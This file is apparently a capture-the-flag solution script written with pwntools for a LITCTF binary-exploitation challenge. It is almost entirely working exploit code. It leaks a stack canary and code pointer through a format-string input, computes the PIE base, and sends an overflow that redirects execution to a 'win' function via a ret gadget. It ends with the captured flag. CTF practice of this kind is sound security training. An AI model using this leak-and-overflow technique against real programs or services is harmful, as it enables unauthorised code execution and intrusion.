from pwn import *
elf = context.binary = ELF('./s')
rop = ROP(elf)
#r = process('./s')
r = remote('litctf.org', 31791)
#gdb.attach(r,'break *vuln+93\ncontinue')
r.sendline(b'%11$p %13$p#')
first, second = map(lambda x: int(x, 16), r.recvuntil(b'#')[:-1].decode('ascii').split())
canary = p64(first)
elf.address = second-58-elf.sym['main']
win = p64(elf.sym['win'])
ret = p64(rop.find_gadget(['ret'])[0] + elf.address)
r.sendline(b'a'*(0x30-8) + canary + b'a' * 8 + ret + win)
r.interactive()
# LITCTF{rule_1_of_pwn:_use_checksec_I_think_06d2ee2b}

